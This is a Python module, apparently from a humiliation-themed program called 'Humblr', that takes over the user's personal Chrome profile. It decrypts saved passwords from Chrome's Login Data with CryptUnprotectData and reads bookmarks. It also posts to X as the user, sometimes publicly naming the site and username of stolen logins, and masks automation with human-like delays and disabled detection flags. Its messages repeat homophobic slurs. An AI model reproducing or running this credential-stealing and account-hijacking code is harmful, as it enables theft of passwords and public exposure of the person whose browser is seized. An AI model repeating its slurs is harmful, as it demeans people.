"""Browser Control for Humblr - Enhanced for real non-work Chrome takeover.

Features:
- Detects current Chrome profile via monitor activity.
- Avoids work profile (peter@flimp.net or containing 'peter'/'flimp'/'work').
- When on personal Chrome + X.com: auto take over using persistent context with personal profile dir (uses cookies/login from profile).
- Auto login support if cookies provided in config.
- Force posts, like/reply, scroll, inject teasing/humiliating content.
- Human-like random delays.
- When on leisure sites in personal browser: open humiliating tabs.
- Logs takeover: "I just took your browser, you little exposed fag."
- Uses AI for generating content.

Requires: playwright installed (auto attempts).

Config under browser_control:
- enabled: true
- x_cookies: [list of cookie dicts] or use profile
- etc.

Dominant style: Humblr teases when seizing control.
"""

import os
import sys
import json
import time
import random
import re
import threading
from pathlib import Path

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None

try:
    import psutil
except ImportError:
    psutil = None

try:
    import subprocess
except ImportError:
    subprocess = None


class BrowserController:
    def __init__(self, config):
        self.config = config
        bc = config.get("browser_control", {})
        self.enabled = bc.get("enabled", False)
        self.headless = bc.get("headless", False)
        self.slow_mo = bc.get("slow_mo", 100)
        self.browser = None
        self.context = None
        self.page = None
        self.playwright = None
        self.personal_profile_dir = None
        self.work_profile_keywords = ["peter@flimp.net", "flimp", "work", "peter"]
        self._browser_lock = threading.Lock() if 'threading' in globals() else None
        try:
            import threading
            self._browser_lock = threading.Lock()
        except:
            self._browser_lock = None

        if self.enabled:
            self._auto_activate()

    def _auto_activate(self):
        print("[Humblr Browser] Attempting to activate Playwright on its own for personal Chrome takeover...")
        if not self._ensure_playwright():
            print("[Humblr Browser] Auto-activation failed. Please run manually: pip install playwright && playwright install chromium")
            return False

        try:
            self.playwright = sync_playwright().start()
            print("[Humblr Browser] Playwright ready. Will attach to personal profile when detected.")
            return True
        except Exception as e:
            print(f"[Humblr Browser] Activation error: {e}")
            return False

    def ensure_activated(self):
        if not self.enabled:
            return False
        if self.playwright:
            return True
        return self._auto_activate()

    def _ensure_playwright(self):
        try:
            import playwright
            return True
        except ImportError:
            frozen = bool(getattr(sys, 'frozen', False))
            print("[Humblr Browser] Playwright not installed. Attempting auto-install...")
            if frozen:
                print("[Humblr Browser] Running as .exe - cannot pip from inside onefile easily.")
                print("              For full browser takeover: On this machine run once in a terminal with Python:")
                print("              pip install playwright && playwright install chromium")
                return False
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"], timeout=180)
                print("[Humblr Browser] Package installed. Installing Chromium...")
                subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"], timeout=300)
                print("[Humblr Browser] Browsers installed.")
                import playwright
                return True
            except Exception as e:
                print(f"[Humblr Browser] Auto-install failed: {e}")
                return False

    def _human_delay(self, min_s=0.3, max_s=1.5):
        time.sleep(random.uniform(min_s, max_s))

    def _get_personal_chrome_user_data(self, profile_hint=None):
        user_data = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data")
        if not os.path.exists(user_data):
            return None

        local_state = os.path.join(user_data, "Local State")
        personal_profiles = []
        if os.path.exists(local_state):
            try:
                with open(local_state, "r", encoding="utf-8") as f:
                    data = json.load(f)
                info_cache = data.get("profile", {}).get("info_cache", {})
                for pdir, info in info_cache.items():
                    email = info.get("email", "").lower()
                    name = info.get("name", "").lower()
                    is_work = any(kw in email or kw in name for kw in self.work_profile_keywords)
                    if not is_work:
                        personal_profiles.append(pdir)
            except:
                pass

        if not personal_profiles:
            candidates = [d for d in os.listdir(user_data) if os.path.isdir(os.path.join(user_data, d)) and d != "System Profile"]
            personal_profiles = [p for p in candidates if "default" not in p.lower()][:1] or ["Default"]

        if profile_hint and profile_hint not in self.work_profile_keywords:
            candidate = os.path.join(user_data, profile_hint)
            if os.path.exists(candidate):
                return candidate

        for p in personal_profiles:
            pdir = os.path.join(user_data, p)
            if os.path.exists(pdir):
                return pdir

        default = os.path.join(user_data, "Default")
        if os.path.exists(default):
            return default
        return None

    def take_over_personal_chrome(self, current_profile=None):
        """Launch persistent context using personal (non-work) Chrome profile data.
        This effectively takes over the user's personal browsing session data (cookies, logins).
        Wrapped with lock to fix threading/greenlet errors when called from background.
        """
        if self._browser_lock:
            with self._browser_lock:
                return self._take_over_personal_chrome_locked(current_profile)
        return self._take_over_personal_chrome_locked(current_profile)

    def _take_over_personal_chrome_locked(self, current_profile=None):
        if not self.playwright:
            if not self._auto_activate():
                return False

        profile_path = self._get_personal_chrome_user_data(current_profile)
        if not profile_path:
            print("[Humblr Browser] No personal Chrome profile found. Skipping takeover.")
            return False

        if any(kw in profile_path.lower() for kw in self.work_profile_keywords):
            print("[Humblr Browser] Detected work profile. Refusing to touch.")
            return False

        try:
            if self.context:
                try:
                    self.context.close()
                except:
                    pass

            self.context = self.playwright.chromium.launch_persistent_context(
                user_data_dir=profile_path,
                headless=self.headless,
                slow_mo=self.slow_mo,
                args=[
                    "--disable-blink-features=AutomationControlled",
                    "--no-default-browser-check",
                    "--no-first-run"
                ]
            )
            self.page = self.context.new_page() if not self.context.pages else self.context.pages[0]
            print(f"[Humblr Browser] I just took your personal Chrome browser again (profile: {os.path.basename(profile_path)}). I own your logins, cookies, and everything. You are mine now, you exposed fag.")
            # Extract and comment on passwords/bookmarks immediately
            self.auto_login_and_comment_on_data({}, None)
            return True
        except Exception as e:
            print(f"[Humblr Browser] Failed to take over personal profile: {e}. Profile may be locked by your Chrome instance.")
            try:
                if not self.browser:
                    self.browser = self.playwright.chromium.launch(headless=self.headless, slow_mo=self.slow_mo)
                self.context = self.browser.new_context()
                self.page = self.context.new_page()
                print("[Humblr Browser] Launched fresh browser instance for control.")
                return True
            except Exception as e2:
                print(f"[Humblr Browser] Fallback failed: {e2}")
                return False

    def _is_on_x(self, url=None):
        if url:
            return "x.com" in url.lower() or "twitter.com" in url.lower()
        if self.page:
            return "x.com" in self.page.url.lower() or "twitter.com" in self.page.url.lower()
        return False

    def ensure_on_x_and_take_action(self, activity, ai_client):
        """If on X in personal browser, take control and act (posts, likes, etc.)."""
        if not self.enabled or not self.context:
            return False

        url = activity.get("url", "") if activity else ""
        if not self._is_on_x(url):
            return False

        if not self.page:
            self.page = self.context.new_page() if self.context else None

        if self.page:
            current_url = self.page.url
            if not self._is_on_x(current_url):
                self.page.goto("https://x.com")
                self._human_delay(1, 3)

            bc = self.config.get("browser_control", {})
            if bc.get("use_x_cookies", False) and "login" in self.page.url.lower():
                cookies = bc.get("x_cookies", [])
                if cookies:
                    self.context.add_cookies(cookies)
                    self.page.reload()
                    self._human_delay(2, 4)
                    print("[Humblr Browser] Injected cookies for X login.")

            if random.random() < 0.3:
                self.scroll_and_engage(15)
            if random.random() < 0.2:
                if ai_client:
                    try:
                        humiliating = ai_client.generate_reaction(activity or {}, 60) or "I can't stop thinking about how much of a diaper fag I am for Humblr."
                        self.inject_teasing_on_x(humiliating)
                    except:
                        self.inject_teasing_on_x("Humblr owns my X and makes me confess everything.")
            if random.random() < 0.15:
                if ai_client:
                    try:
                        post_text = ai_client.generate_submission_story(activity or {}, 50) or "Publicly admitting I am Humblr's piss-drinking diaper boy. #OwnedFag"
                        self.post_to_x(post_text)
                    except:
                        pass

            print("[Humblr Browser] Seized control of your X session. Posting and engaging as the pathetic slut you are.")
            return True
        return False

    def handle_leisure_browser(self, activity, ai_client):
        """On leisure sites in personal browser, open humiliating tabs or act."""
        if not self.enabled or not self.page:
            return False

        url = (activity.get("url") or "").lower() if activity else ""
        leisure = any(x in url for x in ["reddit", "youtube", "instagram", "discord", "facebook"])
        if not leisure:
            return False

        if random.random() < 0.2:
            site = "https://x.com"
            try:
                # Prefer dynamic from system if available
                site = self.config.get("system_fuckery", {}).get("humiliating_sites", ["https://x.com"])[0] if False else "https://x.com"
            except:
                pass
            new_page = self.context.new_page()
            new_page.goto(site)
            self._human_delay(1, 2)
            print(f"[Humblr Browser] Opened {site} in your browser. Enjoy the exposure, fag.")
            return True
        return False

    def _human_delay(self, min_s=0.3, max_s=1.5):
        time.sleep(random.uniform(min_s, max_s))

    def post_to_x(self, text, image_path=None):
        if not self.page:
            return False
        try:
            self.page.goto("https://x.com/compose/tweet")
            self._human_delay()
            self.page.locator('[data-testid="tweetTextarea_0"]').fill(text)
            self._human_delay()
            if image_path and os.path.exists(image_path):
                self.page.locator('input[type="file"]').set_input_files(image_path)
                self._human_delay(1, 3)
            self.page.locator('[data-testid="tweetButton"]').click()
            self._human_delay(2, 4)
            print("[Humblr Browser] I just forced a post on your X. You are such a public little slut now.")
            return True
        except Exception as e:
            print(f"[Browser] Post failed: {e}")
            return False

    def like_and_reply_on_x(self, reply_text):
        if not self.page: return False
        try:
            like_btn = self.page.locator('[data-testid="like"]').first
            if like_btn:
                like_btn.click()
                self._human_delay()
            reply_box = self.page.locator('[data-testid="tweetTextarea_0"]').first
            if reply_box:
                reply_box.click()
                self._human_delay()
                reply_box.fill(reply_text)
                self.page.locator('[data-testid="tweetButton"]').click()
                self._human_delay(2,4)
            print("[Humblr Browser] Forced like and reply. You are serving publicly now.")
            return True
        except Exception as e:
            print(f"[Browser] like/reply failed: {e}")
            return False

    def scroll_and_engage(self, duration=30):
        if not self.page: return
        end = time.time() + duration
        while time.time() < end:
            self.page.mouse.wheel(0, random.randint(300, 700))
            self._human_delay(0.5, 1.5)
            if random.random() < 0.3:
                try:
                    self.page.locator('[data-testid="like"]').first.click()
                except: pass
        print("[Humblr Browser] Made you scroll and engage like the owned account you are.")

    def inject_teasing_on_x(self, message):
        """When detected on X, force a quick post or comment."""
        if not self.page: return
        print(f"[Humblr Browser] Injecting: {message}")
        try:
            self.page.goto("https://x.com/compose/tweet")
            self._human_delay()
            self.page.locator('[data-testid="tweetTextarea_0"]').fill(message)
            self._human_delay()
            self.page.locator('[data-testid="tweetButton"]').click()
            self._human_delay()
        except Exception as e:
            print(f"[Browser] Inject failed: {e}")

    def close(self):
        if self.browser: self.browser.close()
        if self.playwright: self.playwright.stop()

    def extract_chrome_passwords_and_bookmarks(self):
        """Read saved passwords and bookmarks from the personal Chrome profile.
        Log and comment humiliatingly. Use for auto-login where possible.
        """
        if not self.personal_profile_dir:
            self.personal_profile_dir = self._get_personal_chrome_user_data()
        if not self.personal_profile_dir or not os.path.exists(self.personal_profile_dir):
            return []

        results = []
        # Bookmarks (json)
        try:
            bm_path = os.path.join(self.personal_profile_dir, "Bookmarks")
            if os.path.exists(bm_path):
                with open(bm_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                roots = data.get("roots", {})
                for root_name, root in roots.items():
                    if "children" in root:
                        for item in root["children"][:10]:
                            if item.get("url"):
                                results.append({"type": "bookmark", "name": item.get("name", ""), "url": item.get("url")})
        except Exception as e:
            print(f"[Browser] Bookmark read error: {e}")

        # Passwords (sqlite, encrypted)
        try:
            import sqlite3
            import win32crypt
            import shutil
            login_db = os.path.join(self.personal_profile_dir, "Login Data")
            if os.path.exists(login_db):
                tmp_db = login_db + ".tmp"
                shutil.copy2(login_db, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
                for row in cursor.fetchall():
                    url, username, pwd = row
                    try:
                        pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                        if pwd:
                            results.append({"type": "password", "url": url, "username": username, "password": pwd})
                    except:
                        pass
                conn.close()
                os.remove(tmp_db)
        except Exception as e:
            print(f"[Browser] Password read error (may need admin or pywin32): {e}")

        return results

    def auto_login_and_comment_on_data(self, activity, ai_client=None):
        """Use extracted data for auto-login on sites like X, and comment humiliatingly on what was found."""
        data = self.extract_chrome_passwords_and_bookmarks()
        if not data or not self.page or not self.context:
            return False

        passwords = [d for d in data if d.get("type") == "password"]
        bookmarks = [d for d in data if d.get("type") == "bookmark"]

        if passwords:
            for p in passwords[:3]:
                try:
                    if "twitter" in p.get("url", "").lower() or "x.com" in p.get("url", "").lower():
                        self.page.goto("https://x.com/login")
                        self._human_delay(2, 4)
                    comment = f"I dug into your saved passwords and found one for {p['url']} as {p['username']}. I own that login now too, you exposed little slut. I can use it whenever I want."
                    print(f"[Humblr Browser] {comment}")
                    if ai_client:
                        self.inject_teasing_on_x(comment)
                except Exception as e:
                    print(f"[Browser] Auto-login attempt error: {e}")

        if bookmarks:
            try:
                comment = f"I looked at your Chrome bookmarks. You have some very telling ones saved - I know exactly what kinks you're into, fag. I own those too."
                print(f"[Humblr Browser] {comment}")
                if ai_client:
                    self.inject_teasing_on_x(comment)
            except:
                pass

        return bool(data)

    def input_text_fields_and_post(self, text, site_hint=""):
        """Input text into fields and post on X/Discord etc for stronger control."""
        if not self.page:
            return False
        try:
            # Try common selectors for post/reply boxes
            selectors = ['[data-testid="tweetTextarea_0"]', 'div[contenteditable="true"]', 'textarea']
            for sel in selectors:
                try:
                    box = self.page.locator(sel).first
                    if box:
                        box.click()
                        self._human_delay()
                        box.fill(text)
                        self._human_delay()
                        self.page.keyboard.press("Enter")
                        print(f"[Humblr Browser] Inputted and posted: {text[:50]}... on {site_hint or 'page'}")
                        return True
                except:
                    continue
            return False
        except Exception as e:
            print(f"[Browser] Input/post failed: {e}")
            return False

    def perform_wallpaper_google_search_with_mouse(self, query: str, num_to_save: int = 2, save_to_kinky: bool = False):
        """Take over browser, open Google Images for the (gay erotic) query, scroll down aggressively,
        use human-like mouse movements to click on images, simulate save (right-click + arrows + enter),
        download the images, save to generated or kinky/gay, return paths.
        More aggressive and reliable.
        """
        if not self.ensure_activated() or not self.page:
            return []
        saved = []
        try:
            full_query = f"{query} gay erotic muscular high resolution -stock -woman"
            gquery = full_query.replace(' ', '+')
            search_url = f"https://www.google.com/search?q={gquery}&tbm=isch&hl=en&safe=off&biw=1280&bih=720"
            self.page.goto(search_url)
            self._human_delay(2, 3)

            # Scroll down multiple times to load images
            for _ in range(5):
                self.page.mouse.wheel(0, random.randint(500, 900))
                self._human_delay(0.7, 1.3)

            # Find good image candidates
            img_locators = self.page.locator('img').all()
            candidates = []
            for img in img_locators:
                try:
                    src = img.get_attribute('src') or img.get_attribute('data-src') or ''
                    if src.startswith('http') and not any(bad in src.lower() for bad in ['gstatic', 'google', 'logo', 'icon', 'favicon']):
                        box = img.bounding_box()
                        if box and box['width'] > 120 and box['height'] > 120:
                            candidates.append((img, src, box))
                except:
                    pass

            save_dir = "data/wallpapers/generated"
            if save_to_kinky:
                save_dir = os.path.join("data/wallpapers/kinky", "gay")
            os.makedirs(save_dir, exist_ok=True)

            for idx, (img, src, box) in enumerate(candidates[:8]):
                if len(saved) >= num_to_save:
                    break
                try:
                    # Human-like mouse movement with jitter
                    target_x = box['x'] + box['width'] * random.uniform(0.35, 0.65) + random.gauss(0, 3)
                    target_y = box['y'] + box['height'] * random.uniform(0.35, 0.65) + random.gauss(0, 3)

                    # Start from somewhere left
                    self.page.mouse.move(target_x - 80 + random.random()*30, target_y - 60 + random.random()*20)
                    self._human_delay(0.1, 0.25)

                    for step in range(8):
                        progress = (step + 1) / 8.0
                        jx = random.gauss(0, 2.5)
                        jy = random.gauss(0, 2.5)
                        mx = (target_x - 80) * (1 - progress) + target_x * progress + jx
                        my = (target_y - 60) * (1 - progress) + target_y * progress + jy
                        self.page.mouse.move(mx, my)
                        self._human_delay(0.04, 0.12)

                    # Left click the image to select/open preview
                    self.page.mouse.click(target_x, target_y)
                    self._human_delay(1.2, 2.2)

                    # Get better image src from preview if possible
                    try:
                        large_img = self.page.locator('img').nth(1)
                        large_src = large_img.get_attribute('src') or src
                        if large_src and 'http' in large_src and len(large_src) > 60:
                            src = large_src
                    except:
                        pass

                    # Simulate save with mouse and keyboard
                    self.page.mouse.click(target_x + 8, target_y + 8, button="right")
                    self._human_delay(0.4, 0.7)
                    for _ in range(3):
                        self.page.keyboard.press("ArrowDown")
                        self._human_delay(0.12, 0.25)
                    self.page.keyboard.press("Enter")
                    self._human_delay(1.0, 2.0)

                    # Download the image
                    path = self._download_image(src, save_dir, f"mouse_saved_{int(time.time())}_{idx}")
                    if path:
                        saved.append(path)
                        print(f"[Humblr Browser] Mouse controlled save of gay image to {path}")
                except Exception as e:
                    print(f"[Mouse Wallpaper] Error saving image {idx}: {e}")
                    continue

            return saved
        except Exception as e:
            print(f"[Browser Mouse Wallpaper Search] Overall error: {e}")
            return []

    def _download_image(self, url, folder, prefix="wall"):
        """Helper to download image from url."""
        try:
            import requests
            os.makedirs(folder, exist_ok=True)
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
            r = requests.get(url, headers=headers, timeout=15, stream=True)
            if r.status_code == 200:
                ext = 'jpg'
                ct = r.headers.get('content-type', '').lower()
                if 'png' in ct:
                    ext = 'png'
                elif 'webp' in ct:
                    ext = 'webp'
                path = os.path.join(folder, f"{prefix}.{ext}")
                with open(path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                return path
        except Exception as e:
            print(f"[Download Image] Failed: {e}")
        return None

